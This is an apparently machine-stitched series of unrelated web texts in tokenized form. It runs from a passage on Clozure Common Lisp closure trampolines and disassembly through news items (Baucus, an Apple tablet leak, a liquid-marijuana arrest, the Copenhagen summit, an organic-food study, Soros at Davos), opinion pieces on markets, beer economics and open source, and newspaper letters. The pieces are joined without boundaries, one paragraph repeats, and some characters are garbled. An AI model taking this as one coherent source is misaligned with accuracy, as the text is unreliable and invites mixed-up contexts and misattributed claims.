#' next-val #<COMPILED-LEXICAL-CLOSURE
NEXT-VAL #x302000EEA42 F >
So , that ’s different .
Before we saw output like :
#< Compiled - function 2 - TO - THE # x302000A53B8 F >
Let ’s look at that function ’s constants :
? ( %nth- immediate #' next- val 0 ) #< Compiled - function NEXT -VAL ( Non-Global ) # x302000EECCFF >
What ’s this ?
The function next - val is actually a little trampoline function that sets up and calls the actual closure function .
DISASSEMBLE tries to be friendly and shows you the disassembly of the closure function rather than the trampoline , but we can directly call an internal function to see the trampoline itself :
? ( x86-xdisassemble #'next - val ) L0 [ 0 ] ( leaq ( @ ( :^ L0 ) ( % rip ) ) ( % fn ) ) [ 7 ] ( jmpq ( @ . SPCALL - CLOSURE ) )
Finally , we can start to see what init - nclosure does .
The code fragment that is init - nclosure generates ( at run- time ) the little bit of code shown above .
The closed - over values are found in the trampoline function ’s constants .
? ( %nth- immediate #'next- val 1 ) #< VALUE-CELL 0 #x302000EEA46D >
And I mentioned that $ lfbits - trampoline - bit would be on in the function ’s lfun - bits :
? ( logbitp $ lfbits - trampoline - bit ( %nth- immediate #' next- val 2 ) ) T
When the trampoline is actually called , it jumps to the .SPcall - closure subprimitive in the lisp kernel ( see ccl:lisp - kernel;x86-spentry64.s ) , which prepends the constants in the trampoline representing the closed - over values to the closure function ’s arglist , and calls it .
A closure function thus sees any closed - over values as regular arguments .
? ( disassemble #'next - val ) L0 [ 0 ] ( leaq ( @ ( :^ L0 ) ( % rip ) ) ( % fn ) ) [ 7 ] ( cmpl ( $ 8 ) ( % nargs ) ) [ 10 ] ( jne L93 ) [...]
%nargs is the register that contains the ( fixnum ) count of arguments passed to the function .
If it ’s not fixnum 1 , then error .
Note that next - val ’s lambda list is nil — the argument it is expecting is the closed over value of n .
Anyway , sorry to pontificate at such length about a topic of limited interest , but there it is .

We 're guessing the Baucus Plan is toast now .
-----
AP : Senate Finance Committee Chairman Max Baucus was romantically involved with his current girlfriend when he recommended her for U.S. attorney , a spokesman said .
The Montana Democrat and his former state office director Melodee Hanes began their relationship in the summer of 2008 , after Baucus separated from his wife , Ty Matsdorf told The Associated Press late Friday .
Baucus nominated Hanes for the U.S. attorney post in Montana in March .
But she later withdrew , saying she had been presented with other opportunities she could n't pass up .
The Senate leader who 's lately been a major proponent of Democratic health care legislation had submitted six names to a third - party reviewer , who whittled those to Hanes and two others .
Matsdorf said the senator sent the three names to the White House with no ranking .
" Senator Baucus recommended each of the three candidates based solely on qualifications , and merit , knowing whichever one the White House selected would serve Montana well , " Matsdorf said .
The spokesman said Baucus and Hanes decided during the nomination process that she should withdraw her name because the couple wanted to live together in Washington , which they later did .
Hanes started working for Baucus in 2002 and was his state director before leaving his office earlier this year for a position in the U.S. Department of Justice .
" Mel is supremely qualified and she got to her current position based solely on her merit , " Matsdorf said .
Baucus was elected to the Montana House in 1973 and to the U.S. House in 1974 and 1976 .
He was elected to the U.S. Senate in 1978 at age 36 , and is up for re-election in 2014 .
He has played increasingly visible roles in Congress , sometimes willing to buck his Democratic Party on certain issues .
He recognizes the state that sent him to the Senate for five terms is fundamentally conservative and its voters want someone willing to base votes on more than party lines .
Baucus and his ex-wife Wanda announced last April that they planned to divorce after 25 years of marriage , ending speculation that they had been separated since last year .
In a joint statement , they said they said they have " parted ways amicably and with mutual respect . "
Baucus and his ex-wife Wanda announced last April that they planned to divorce after 25 years of marriage , ending speculation that they had been separated since last year .
In a joint statement , they said they said they have " parted ways amicably and with mutual respect . "
Before the April announcement , Baucus said the couple had some " differences " in the marriage , which was his second .
President Barack Obama eventually nominated Helena attorney Michael Cotter for the job , which includes supervising prosecutors of all federal crimes committed in Montana and the state 's seven Indian reservations .
Cotter is awaiting confirmation .
Most recently Baucus has been at the center of a bipartisan effort to move sweeping health care legislation through the Senate with a bill aimed at meeting Obama 's goal of overhauling the nation 's health care system .
The Democrat has also been in the middle of other congressional battles :
He played a key role in 2003 legislation adding a prescription - drug benefit to the Medicare program and enactment of President George W. Bush 's tax cuts in 2001 .
Baucus also has secured millions in federal funding for highways and billions in disaster aid for drought - plagued farmers and ranchers .
I ’m writing a new programming language called Exoself .
I ’ll document here how I ’m solving various problems I encounter ( ed ) while creating a compiler for Exoself .
This series begins with a very informal introduction describing how compilers work in principle and which tools I choose for building my compiler .
The following posts first discuss the different stages during compilation in a general manner and will discuss several problems a compiler writer has to solve .
Later I ’m planning to add detailed posts describing how to implement different syntactical constructs using Exoself as an example language using my tool set .
So far I ’ve written the following posts .
Terry McGraw , the chief executive of McGraw - Hill & Co. , appears to have let the cat out of the bag , confirming the existence of the Apple tablet on national TV .
Appearing on CNBC following the company 's earnings call , McGraw was asked about the possibility about putting his company 's materials on the Apple tablet .
It 's the kind of question journalists ask , without really expecting to get an answer , especially one being broadcast live to millions of people .
Pay dirt .
And not just a vague confirmation , but even a spec !
" Yes , very exciting .
Very exciting .
They 'll make their announcement tomorrow , on this one , " McGraw said .
" We have worked with Apple for quite a while , and their -- the tablet will be based on the iPhone operating system , and so it will be transferable .
So what you 're going to be able to do now -- we have a consortium of ebooks , and we have 95 percent of our all materials that are in ebook format on that one so now with the tablet you 'll going to open up that market the higher education market , the professional market .
The tablet is going to be just really terrific .
" McGraw 's confirmation itself confirms that the tablet will be an e-reader of a sort , and targeted at the vertical markets .
The Apple quote begins at just about 2:48 in the clip .

A Bensonhurst man was arrested on Wednesday for selling a dark green liquid mixture of alcohol and marijuana .
Yes , liquid marijuana !
It 's news to us , and Capt .
Gerard Dowling of the Manhattan South narcotics division says " it has not been seen around here before . "
The suspect , 32 - year - old Anthony Briordy , told cops a four - ounce dose of it was stronger than one " marijuana cigarette , " as the Times daintily puts it .
Briordy had eight Mason jars of the stuff in his apartment , plus cocaine , Percocet , Xanax , oxycodone , ecstasy and ketamine .
Quite the collection .
An undercover officer started buying from him a couple of months ago as he allegedly peddled drugs from his car , and this week he finally invited them into his apartment , where he brewed the distilled marijuana resins fermented with 180 - proof grain alcohol .
According to the Post ( which goes with the headline " Stir the Pot " ) Briordy faces 22 felony counts of drug dealing .
Briordy allegedly told detectives he was selling about 16 ounces of the substance for $ 120 ; the liquid could then be mixed with juice , alcohol , or surreptitiously poured into punchbowls at government functions to bring about world peace .
Up in Canada , you can also purchase ( with a prescription ) a liquid marijuana extract called Sativex that 's sprayed into the mouth .
And preliminary Google search turned up this recipe for extracting the essential oils from hemp — the instructions seem similar to what police describe as Briordy 's method , but clearly further research is called for .
Barack Obama is poised to arrive in Copenhagen tomorrow with additional pledges of cash for poor countries which will suffer the most from global warming , a day after America 's promise to support a $ 100 bn a year climate fund .
Obama 's arrival has been the most anticipated event of the 10 - day summit , which has lurched between optimism and rank despair .
He will seek to make a decisive impact , building on the announcement today by Hillary Clinton , the secretary of state , who said for the first time that America would support a $ 100 bn global climate change fund from 2020 .
But she will be a tough act to follow , as the statement was seen by delegates as a gamechanger .
Obama is expected to add an extra boost of momentum by beefing up America 's share in a $ 10 bn a year fast - track aid package .
That aims to cushion poor countries from the impact of climate change and promote rainforest preservation starting next year .
He is also expected to outline little - known provisions in the climate bill passed by the House of Representatives that would direct some $ 4bn a year from the auction of emission allowances to a fund to help developing countries adapt to climate change and deploy clean technology .
He is also expected to call more forcefully on the Senate to pass climate change law , critical to the eventual success of Copenhagen .
" I 've got a sense that she set the table , and he is going to deliver the knock - out punch , " said Earl Blumenauer , part of the delegation of Democratic congressmen to the talks .
Clinton gave no specifics on how America would raise its share of the $ 100bn fund , and she made her offer contingent on overcoming an atmosphere of mistrust to reach a deal at Copenhagen .
" It is no secret that we have lost precious time in these past days , " she said .
" In the time we have left here , it can no longer be about us versus them — this group of nations pitted against that group .
We all face the same challenge together . "
She also said the deal must include an international regime to monitor and verify pledges by developing countries to curb their emissions .
Clinton said there could be no deal without such checks in place .
" If there is not even a commitment to pursue transparency , that 's kind of a dealbreaker for us , " she said .
Clinton 's appearance here — only hours after the summit's Danish hosts had given up hopes of reaching a deal — was widely credited with pulling the negotiations back from the brink .
Environmental organisations said America still needed to provide details about the sources of funding , and how it would be distributed .
Clinton would only say there would be public and private investment , and that America was exploring several different potential soures of funding .
But British officials said last night that the US move puts the onus on the European Union to decide whether to make good on its promise to raise its emissions reductions target to 30 % in the event of strong action at the summit .
EU officials were meeting to discuss the next move tonight . .
Alden Meyer , director of strategy for the Union of Concerned Scientists , said America 's support for the $ 100bn climate fund gave China the cover it needed to back down gracefully from the showdown over accountability .
" Now China can be magnanimous and say it is acting in solidarity with its brothers and sisters in Africa [ who will benefit from the money ] , and that it is not going to stand in the way of a deal , " he said .
Although industrialised countries had cobbled together a package of short - term aid for African countries and low - lying islands that will suffer the worst ravages of global warming , there had been little movement on mobilising the billions that will be required over the long haul .
Clinton 's intervention helps supply that crucial missing link .
The $ 100 bn figure was formally put on the table at the conference by the Ethiopian prime minister , Meles Zenawi , who is head of the African group of nations .
It is much lower than many developing nations say is necessary to help them adapt to climate change and develop green technologies , with esitmates ranging up to $ 600 bn a year .
The American offer to puts its share into the $ 100bn climate fund is unlikely to win over all objections to the deal from African countries and small island states .
" If nobody is going to be alive to get a dime of it , how far does this take us ? " asked Hama Arba Diallo , a member of parliament from Burkina Faso .
Amisa Elamia , the prime minister of the Pacific island nation of Tuvalu , said he would be unable to sign on to an agreement unless it sought more stringent emissions cuts that would limit global warming to 1.5C .
Negotiators are currently discussing limiting warming to 2C .
" Over the last few days we have faced considerable pressure to accept a deal based around 2C .
We have not yielded to this pressure because our future is not negotiatiable , " he said .
" I will not sign anything that is not 1.5C . "
A £ 12 m EU - funded investigation into the difference between organic and ordinary farming has shown that organic foods have far more nutritional value .
Up to 40 per cent more antioxidants , which scientists believe can cut the risk of heart disease and cancer , could be found in organic fruit and vegetables than in those conventionally farmed .
In the four - year Quality Low Input Food project , the biggest of its kind to date , a farm in north - east England grew conventional produce alongside organic varieties .
Cattle were also farmed on the 725 - acre plot , where it has been discovered that organic milk contains 60 per cent more antioxidants and desirable fatty acids than ordinary milk .
Download the new Independent Premium app Sharing the full story , not just the headlines
Professor Carlo Leifert , co-ordinator of the study said : " We have shown there are more of certain nutritionally desirable compounds and less of the baddies in organic foods , or improved amounts of the fatty acids you want and less of those you do n't want " .
The study , whose overall findings will be published next year , is the first systematic comparison of farming techniques .
Led by Newcastle University , 33 academic centres across Europe are analysing the information .
For the past seven years the organic food lobby has been trying unsuccessfully to persuade the Food Standards Agency ( FSA ) to acknowledge the benefits of organic food .
The FSA says the " balance of current scientific evidence " does not support the view that organic food is safer or healthier .
The Soil Association , the UK's leading campaigning and certifying organisation on organic farming , said : " It is time the FSA caught up with the available science and adjusted its statements to reflect that science . "
The FSA said : " We will be getting a consultancy to carry out a systematic review of the evidence , which will include this latest study . "
The report 's key findings
* Organic milk contains higher amounts of vitamin E , according to the EU study .
The antioxidant contributes to a healthy circulatory system
* Potatoes , kiwi fruit and carrots were among the organic produce found to be higher in vitamin C than their chemically - farmed counterparts .
The vitamin has been credited with boosting the immune system and helping to keep cancer and heart disease at bay
* Higher levels of minerals and antioxidants were found in organically - farmed lettuce , spinach and cabbage

A market is the voluntary coming together of two groups of people : those that have something to sell and those that want to buy what is being sold at the price it is being offered .
The former group is called producers and the latter consumers .
A healthy , sustainable economy is one in which producers invest in the necessary resources to produce the good or service that is being consumed .
If business is good and the producers see that they can’t produce enough then they invest in expanding their productive capacity , adding jobs and financial and physical capital and the like .
The decision to expand is based on the actions of the consumers .
The information to the producer is so clear and accurate that the decision to incur additional debt in anticipation of future profits is made .
Hence we then have and economy with a sound manufacturing infrastructure based on good information that is sustainable into the future .
A sick , unsustainable economy is one in which market information is not clear .
It ’s one in which the manufacturing infrastructure is volatile and weak due to this unclear information and the inability of producers and consumers to make good decisions : home loans being made to people who are unemployed , construction jobs building bridges to nowhere , people buying new cars when the one they have is paid for and runs just fine , people investing in funds that are Ponzi schemes just to name a few .
When the government intervenes and spends trillions of dollars , it does nothing to improve the manufacturing infrastructure .
Their position is that they understand what consumers want better than the consumers themselves .
Of course that sounds ridiculous just saying it , but that must be their position otherwise how could they justify being able to u201 C fixu201D the banking and automobile industries ?
Of course only if producers are producing what consumer truly want will the economy be sustainable and obviously they are not when the government intervenes .
Where Keynes Went Wron ... Lewis , Hunter Best Price : $ 5.00 Buy New $ 9.79 ( as of 05:00 EST - Details )
Logically , how can the government claim to understand the financial markets and automobile markets well enough to u201 C fixu201D them when it would seem they did n’t understand them well enough to keep them from reaching the verge of bankruptcy in the first place ?
Furthermore , if the governments ’ argument is that they understand these markets better than the market participants themselves and so well as to know how to go about u201 C fixingu201D them in order to improve the welfare of Americans then should n’t the government take over all the markets ?
What are they waiting for ?
Surely , their ability to understand markets is n’t limited to just finance and cars .
Certainly with this great wealth of financial market information and knowledge and the power to predict financial markets the federal government could simply play the stock market and pay off our $ 14 trillion debt in a matter of years , but we do n’t see them doing that do we ?
Obviously the whole situation is a joke ; trust me , there are thousands of economists in academia around the world who have made careers out of trying to develop models to predict markets , of all kinds , and no one has succeeded yet .
I do n’t think the likes of BO or Bernanke are up to the task .
What the government is doing is simply going on a shopping spree with credit cards .
Like someone who lives beyond their means , it all looks really successful and opulent on the outside but eventually all the credit cards are going to be maxed out and no one will be willing to issue a new one .
Then who will pay the debt off ?
Of course no one will ; it will be defaulted , all or in part , and / or the fed will monetize it which is nothing more than another form of default .
Oh sure for the upcoming midterm election cycle it all looks good .
One can hardly read a major news outlet story today without seeing something about how the economy is in recovery , the fed saved the world ( sound the cavalry charge ) but of course that ’s just a temporary illusion until the government stops spending then we ’ll really see just how bad the economic situation is .
The Dollar Meltdown : S... Goyette , Charles Best Price : $ 0.10 Buy New $ 4.00 ( as of 04:10 EST - Details )
The government with its irresponsible and economically dangerous programs is taking money and future profits from successful consumers and producers and giving it to unsuccessful ones .
The immediate affect looks really nice : $ 1 million can put a lot of people to work very quickly but once the government stops spending the long term effects on the producers and consumers the money was taken from to pay for the spending will be catastrophic .
As many have pointed out : it ’s not a matter of when the financiers of this fraudulent economy will stop loaning us more money but rather simply when .
It may not be in our lifetime or our children ’s lifetime but regardless , if we do n’t do something to address the problem then it does n’t matter when our country is ruined ; we too are just as responsible .
Now so many will say : but if we leave the markets to themselves then greed will ruin us .
Firms collude and monopolize and cause high prices and we ’ll be in the same situation we ’re in now .
After all , it was the free market and lack of sufficient regulation that got us in this mess to begin with .
On the contrary , the fact that our economy is n’t already in ruin is a testimony to the power of the free markets .
Our economy has persevered despite the government thanks to the remaining ability for people to come together and trade .
Economic barriers such as monopolies and government intervention are what motivate people the true market players with the best information to innovate and invent .
To be creative and expand mans ’ breadth of knowledge to new horizons and beyond .
It ’s true : necessity is the mother of invention and it is only because of this that our economy has n’t completely collapsed already .
When gas hit over $ 5 / gallon in the summer of ’08 you could read about ordinary people turning their cars into hybrids for petty cash .
Regular Joe ’s like you and me and now they are selling their newfound ideas and technologies to others for a profit !
That my friends is the free market at work and with all its faults , it ’s the best strategy around for the future of these United States .

Beer .
You 've seen it at sporting events , parties , and backyard barbecues , but have you ever thought about just what goes into that can or bottle ?
Not the ingredients , but economics .
The brewing industry is quite complex , and it takes more than just brewing technique to get your favorite beer into your local store or bar .
Beer , like any good , follows the rules of supply and demand .
If one of its ingredients , such as hops , gets more expensive , the price of the end product can go up .
If grain prices skyrocket due to increased demand for grain - based ethanol to fuel vehicles , beer prices can go up as well .
What makes beer unique is the way it reacts to different economic conditions , and how your government regulates it .
What Type of Good is Beer ?
Is it a normal good , meaning that demand increases as incomes do ?
Is it an inferior good , meaning that demand decreases as does income ( possibly because beer drinkers switch to wine ) ?
Is it a luxury good , meaning that demand increases outstrip increases in income ?
That all depends , though research tends to support the idea that beer is a normal good .
The beer industry is not homogeneous : there is a wide array of beer types available at different price points .
This means that each segment of the overall beer market may react differently to economic cycles .
Brewing as an industry , however , is often considered ' recession - proof . '
For example , the stock of major beer - producing companies rose during the dotcom bust of the late 1990s .
The frothy stuff might not be considered by most to be a luxury good , but when it comes to the basics at the grocery store , it seems to almost fall into the ' can live without ' category .
So when money 's tight , like it is during a recession , what happens to beer consumption ?
It turns out that recessions do n't necessarily lead to a drop in demand ; they lead to a different type of demand .
Consumers switch from more expensive beer to the less expensive varieties , just like consumers switch from name - brand goods to the store - brand version .
The consumption is there , but it's of the cheaper alternative .
Not only do recessions prompt consumers to switch from more expensive brews to more affordable ones ; but new demand also comes from some unlikely sources : wine and liquor drinkers .
When one considers the total market for alcohol - based products , wine and spirits traditionally sit on the more expensive end of the scale .
Consumers still looking for a certain level of luxury in their alcohol purchases consider some beers as a viable alternative .
One way in which brewers have tapped into this trend is by offering beers with higher alcohol content , and by emphasizing the exclusivity of craft beers .
This is not dissimilar from what happens in any other industry , with suppliers creating new product offerings in order to meet burgeoning demand .
Beer Supply
The supply of beer has seen a number of changes in recent years , with increased production from traditional breweries , as well as the emergence of ' craft ' breweries ( those that use more traditional brewing ingredients and methods ) and microbreweries ( lower - volume producers ) .
While the offerings of these two new types of breweries tend to be more expensive than traditional beers , this is n't necessarily because of prestige pricing .
As is the general rule in economics , if demand for a certain beer is greater than the amount the brewer can pump out , prices will be higher .
Larger brewers benefit from economies of scale ; they are able to procure materials in bulk , have easier access to efficient transportation ( beer available in more markets ) , and can produce a large volume of beer .
This is a major reason for the lower prices of mass - produced beer as compared to the output of smaller breweries .
Why are more craft and microbrew beers coming to the market ?
A combination of regulation changes ( President Jimmy Carter signed a bill making home brewing legal in 1979 ) , post - Prohibition rebuilding ( many brewers declared bankruptcy during the American Prohibition ) and shifting consumer tastes have led to an increase in offerings in the beer universe ( at the very least , its U.S. corner ) .
Though craft , microbrew , and traditional beers may target different markets , the overall effect of a rise in the number of brewers is an increase in supply and an increase in competition .
Distribution and Regulation
The distribution of alcohol generally falls into a three - tiered system , which came about post - Prohibition .
What is interesting about this system is that it requires all alcohol ( there are a few exceptions ) to pass through a middleman .
The main reason for establishing the system in this way was to limit the ability of the producers , such as brewers , to own the two primary phases of the industry : production and retail .
The fear was that if big producers controlled everything ( like a Standard Oil of alcohol ) , then consumer choice would be limited , and everyone would be worse off .
While this has worked to some extent , the regulation has created a number of headaches , and even a Supreme Court case ( Granholm v Heald ) .
The three tiers of the system are as follows :
The top tier is comprised of the brewers who produce the beer .
The second tier is distribution .
Producers will often provide exclusive rights to a certain company to distribute its product to different retailers , and the post - Prohibition landscape usually makes distributors powerful entities within each individual state .
This reduces competition and can raise prices since fewer distributors mean less incentive to reduce prices .
Some states have regulations further defining the relationship between the brewer and a distributor , even going as far as to bind a brewer to a distributor legally .
This can create a headache for consumers since disputes between brewers and distributors can result in certain beers becoming unavailable in an area .
The third tier is retail .
This is the point at which the general consumer can purchase the product , whether that be a grocery store , bar , or state - regulated vendor .
As with many things , there is an exception : brewpubs – restaurants or pubs that produce beer on - site for sale on site .
A Unique Beverage
Beer , as well as other types of alcohol , is a unique beverage regulation - wise .
Unlike that of carbonated beverages , fruit drinks , and almost any other beverage you can think of , the supply of beer is closely monitored by local , state , and federal governments , since it is considered a ' vice . '
Municipalities regulate the sale of alcohol , either through state - sponsored stores , taxation , or other limitations , to raise funds or to control residents ' access to alcohol .
Political reasons aside , this can have a dramatic effect on the supply of beer , which in turn can increase its prices .
Limiting the number of suppliers , such as grocery or convenience stores , effectively reduces competition , which in turn can increase the price of the good .
The Bottom Line
Whether you are relaxing at home , or out with friends , the beer in your hand is more than just liquid in a glass : it 's a complex product shaped by supply and demand , production and distribution , with a whole lot of regulation thrown in for that extra kick .
Back in August when LEGO first announced their intentions I was skeptical .
New information released this month gives me a little hope , but just a little .
LEGO : The Adventures of Clutch Powers will be a direct to DVD release .
The premise of the movie sets the LEGO Organization as a sort of benevolent group that innovates , builds civilizations , keeps knowledge , and defends freedom .
The antagonist is an evil wizard by the name of Mallock who has escaped from ( an obviously not innovative enough ) prison and threatens the planet Ashlar .
Clutch Powers leads a special unit of select operatives on a mission to capture Mallock and save the planet .
This article has been reproduced in a new format and may be missing content or contain faulty links .

Look for it in stores around the end of February or pre-order it on Amazon : Lego : Adventures of Clutch Powers
At the time of the first press release , our own Matt Blum asked : “ Have They Gone Too Far This Time ? ” I ’m curious , in light of the new information , do you think the world is ready for a LEGO movie ?
One of the beautiful aspects of open source software development is that individual contributors are , generally speaking , under no obligation to contribute their work .
People who find time on their hands , and an inspiration to do something great , write some code and share it with the world .
End of story .
Or at least , that ’s the way I see it .
Jeff Atwood is pissed because John Gruber has n’t been a “ good mommy ” to Markdown .
Disregarding whether the accusations are true or not , it pisses me off when somebody is criticized for giving something away , yet somehow not giving enough .
What part of FREE do n’t you understand ?
Somebody , in this case John Gruber , wrote something great , and gave it to you for free .
It ’s a technology you would not have access to without his generosity , and which you could not even obtain commercially , had he chosen to keep it private .
A completely new , compelling solution which is available to you because one man had the community - serving idea that it should be open .
Are you getting my drift ?
I grew up in Santa Cruz , California .
A city famous for its hippies , vagrants , and college students .
( At some point in my youth I aspired to fit into each of these classes of people . )
One day I was walking down the main downtown strip , Pacific Avenue , with a half - finished paper cup of coffee in my hands .
A panhandler yelled out to me : “ Can I have your coffee ! ? ”
Feeling generous and well - caffeinated , I surrendered my cup and strolled off .
Moments later , the man shrieked after me : “ There ’s no whisky in this coffee ! ”
You ca n’t please everybody .
In the open source community , and in the larger community that consumes open source goods , there will always be complainers .
For some people , free simply is n’t good enough .
I believe that anybody who gives away the results of their hard labor for free should be praised .
By no means should they be expected to contribute more than they already have , or to bend to the screeching whims of their consumers .
If you do n’t like all of what you ’ve received , take what you do like , and modify it to make it perfect .
Take the free cup of coffee , and add your own damned whisky .

MEDICAL MARIJUANA
A front for full legalization
The Wisconsin Narcotics Officers Association agrees with state Rep. Leah Vukmir ( R - Wauwatosa ) that medical marijuana is a " facade . "
Testimony that is based on science clearly shows that marijuana is a marginal painkiller at best , the U.S. Food and Drug Administration does not approve it , and if Wisconsin passes legislation , our laws would become contrary to federal law .
The parade of people with real medical concerns at the Madison hearing on Senate Bill 368 and Assembly Bill 554 was sad , because those backing this effort are using them to reach their goal of expanded legal marijuana use .
Behind the scene , NORML ( National Organization for Reform of Marijuana Law ) is driving the engine , and the sick as well as well - meaning lawmakers are being used .
Polls show Wisconsinites are behind medical marijuana , I suggest dropping the word medical and ask our citizenry if we want marijuana .
Make no mistake , this is a foot in the door .
It is marijuana legislation , and it is not genuine to refer to it as medical .

Odd logic
Did anyone else think it odd that Rep. Pat Strachota ( R - West Bend ) opposes medicinal marijuana because so many sick people would be included ?
She noted , " The state Department of Health Services said 2.6 million state residents - or nearly half of Wisconsin 's population - have medical conditions that could qualify them for the state registry . "
Why would that be a reason to be against it ?
If the drug companies could find a way to monopolize that homeopathic remedy , it would have been permitted yesterday !

ARCHBISHOP LISTECKI
Contraception option needed
As a practicing Catholic and also as a pediatric nurse practitioner intimately involved on a daily basis with child and adolescent victims of sexual abuse , I was deeply concerned with the statements of Catholic Archbishop - designate Jerome E. Listecki regarding emergency contraception ( Page 1B , Dec. 17 ) .
I am very familiar with both the theology and science of emergency contraception .
To administer this is never a decision made lightly .
It is always done with intense discussion of the purpose and side effects .
Sexual abuse and sexual assault are horrific , almost unspeakable crimes .
The first step in the healing and , so to speak treatment , of this is to offer emergency contraception when age and clinically appropriate .
As a health professional , for me not to offer emergency contraception when indicated to sexual abuse victims , would be medical malpractice .
More importantly for me , from a religious perspective , not to offer this would be moral malpractice .

CHILD CARE
Rating system would help kids
Like many Milwaukee Journal Sentinel readers , we are alarmed by revelations of fraud and connections to drug dealers among child care providers ( Page 1A , Dec. 13 ) .
While the providers profiled in the stories are clearly not reflective of Wisconsin 's 9,000 child care providers as a whole , the theft of tax dollars is disturbing .
It is equally disturbing to consider the quality of care and early education children are receiving in child care programs that are defrauding the government or are fronts for illegal activity .
In addition to the aggressive measures being undertaken by officials to root out the misconduct , it is time to implement a quality improvement and assurance system for Wisconsin Shares that ensures our children are not being served in substandard or harmful settings and also provides incentives and support for programs to meet quality standards .
The Department of Children and Families and Gov. Jim Doyle are working on a detailed proposal for a quality rating and improvement system .
The system would improve early learning for low - income children , provide parents with ratings to help them choose the best child care , help programs meet quality standards , and provide benchmarks for communities to measure the quality of their child care programs .
Other states ' quality rating and improvement systems are showing impressive results .
In the midst of stories of fraud in child care , Wisconsin has the opportunity to make a positive breakthrough for kids : a system that makes sure our children get a solid start .
Readers who share our concerns should encourage their legislators to support the quality rating and improvement system .

HEALTH CARE
Force through expanded care
Until today , I was a staunch supporter of President Barack Obama 's health care reform plan .
I supported it because I believed that the excesses of the health insurance industry must be curbed , tens of millions of uninsured Americans must finally have access to health care and because the free market has failed miserably at providing affordable insurance to all Americans .
I cannot recall a president who came to office with a stronger mandate for reform than did Obama .
With strong majorities in the House and Senate , he should have gotten most , if not all of the reforms he promised in his campaign .
But I concluded that the once robust reform plan has been reduced to a hollow shell that provides no relief to the uninsured and actually enriches the insurance companies at the expense of those uninsured Americans .
Democrats should immediately expand Medicare through the reconciliation process and quit wasting time .
The power of corporate America to purchase legislators and thwart the will of the people is nothing short of breathtaking .

CHILD WELFARE
Officials taking some key steps
Gina Barton's Dec. 14 story " Allegheny County system builds trust by keeping kids with families " highlighted a child welfare agency that has become a national model .
In addition to my quote that " Milwaukee has some work in front of it , " I 'd like to point out that Milwaukee is making progress .
Allegheny County owes its success to 12 years of change , and it benefits from having a human services agency with an array of services that support child welfare .
The Bureau of Milwaukee Bureau Child Welfare can realize similarly good results if the leadership continues along its new course .
Under Gov. Jim Doyle , the state has made organizational changes to create more community services to children and families , like those in Pennsylvania .
Also , the bureau has reduced the number of children in care significantly .
The state 's strategy is aligned with our national mission to accomplish the two most important things for vulnerable children : to keep them safe and to prevent them from languishing in care .
Wisconsin and the bureau are showing a commitment to change and are taking some key steps to improve outcomes for children .

COASTIES
Moniker was n't tied to religion
I was intrigued by the Journal Sentinel 's article about Coasties at the University of Wisconsin - Madison ( Page 1B , Dec. 16 ) .
As a graduate of UW who lived among Coasties of multiple backgrounds in a private dorm , there are few people more qualified to comment on this divide than I am .
I have close friends - gentiles and Jews - from New York , Boston , Washington , Florida , Texas , Illinois and California , among other places .
My point is that a person who discusses the difficulty an East Coaster faces in meshing well with others is either romanticizing and repurposing the struggles undergone by a majority of new college students or pointing a finger in the wrong direction .
A classmate of mine at Marquette University High School and UW , Troy Vosseller , started a company called " Sconnie Nation " in response to the condescension and even scorn heaped upon the locals by Coasties
One of my freshman year roommates , who was from suburban Boston , always smilingly referred to the two of us from Milwaukee as Sconnies .
There was no love lost when we smilingly referred to him as a Coastie .
To bring references to Judaism into the equation is of questionable taste and about as pertinent as it would be to identify Sconnies with Germans .
Whether Coastie is becoming shorthand for " Jew " is separate from the idea of " Jew " or " Wisconsinite " being coded language for something negative .
Having just as many gentile Coasties as Jewish ones among my friends , I can attest to the fact that there is little , if any , actual animosity among these demographics at UW .

FINANCIAL CRISIS
Krugman in denial
Paul Krugman 's column , " Economic disaster and denial , " included his own denial ( Perspectives , Dec. 15 ) .
He never mentioned the pressure put on lenders by Sen. Chris Dodd ( D - Conn . ) and U.S. Rep. Charles Rangel ( D - N.Y. ) and their congressional committees to say nothing of the pressure Acorn put on lenders to make these ridiculous mortgage loans to unqualified people .
Krugman is the one who is in denial of all the facts that led to this mess .

SCHOOL BREAKFAST
Columnist missed the point
Hungry children do not learn :
It 's the basic premise behind the school breakfast program that columnist Mike Nichols missed ( Editorials , Dec. 12 ) .
I applaud school districts in Mequon , Milwaukee and anywhere else that start breakfast programs in school .
Breakfast programs give children of all ages and backgrounds a nutritious start to the school day .
Hunger does not discriminate .
Nichols also fails to mention that school meal programs stimulate business .
In Wisconsin , school meal programs bring in $ 130 million in federal money annually .
Ask companies such as General Mills , Kellogg's , Reinhart Food Service , and dozens of other companies in Wisconsin - school meal programs are good for their bottom line .
So let 's see : School breakfast programs feed children , get school days off to a good start and support businesses all over Wisconsin .
As a taxpayer and parent , I fully support government programs producing such good results .

Frank Miller has spilled the beans on the 300 prequel , revealing the title and some important plot information .
The comic book legend has been working on a follow - up to the original graphic novel , which is now titled Xerxes
He toldit will be set 10 years before the events of 300 and focus on another epic conflict : " It 's the battle of Marathon through my lens .
I 've finished the plot and I 'm getting started on the artwork .
" So the battle of Marathon : a history lesson .
It was an almighty ruckus fought between Spartan 's Greek neighbours the Athenians and the Persian forces of Darius I -- who was ( 300 villain ) King Xerxes ' dad .
As with the battle of Thermopylae 10 years later , the Greek army was hugely outnumbered but eventually won the day .
How Xerses will be involved we 're not sure , but the plot may revolve around his struggle to gain the throne or desire for revenge after seeing his daddy defeated .
Naturally , 300 director Zack Snyder has already expressed interest in transferring the comic to film , whilst Gerard Butler has also said he wouldif Miller could find a way of incorporating his character .

Mr Soros called the current economic crisis a " super bubble " Legendary investor George Soros has called for a radical break - up of banks that are " too big to fail " .
He also backed US President Barack Obama 's proposed reforms to limit the size of banks at the World Economic Forum in Davos .
Speaking at a private lunch , Mr Soros told journalists that Wall Street bankers opposing Mr Obama 's plans were " tone - deaf " .
Other bankers at the event , however , warned against more regulation .
The boss of Barclays Capital , Bob Diamond , said he had " seen no evidence ... to suggest that shrinking banks and making banks smaller and narrower is the answer . "
Other bankers , like Jacob Frenkel of JPMorgan Chase , have said they were worried about " bad regulation " .
' Goldman in Somalia '
Analysing attempts to overcome the crisis , Mr Soros had plenty of praise for Mr Obama 's plan to split big banks - separating their commercial banking bits and their investment arms .
Long story short , bankers here are dazed and confused
Robert Peston
Peston on bankers at Davos Live updates : Davos day one Q&A : World Economic Forum 2010
Ten surprising facts about Davos Send us your comments
Even after the break - up proposed by Mr Obama , most investment banks would " still be too big to fail , " Mr Soros told the lunch guests .
To contain these banks , he said all major economies would have to agree on a common set of financial regulation that set strict limits for leverage - how much money the banks can borrow to invest .
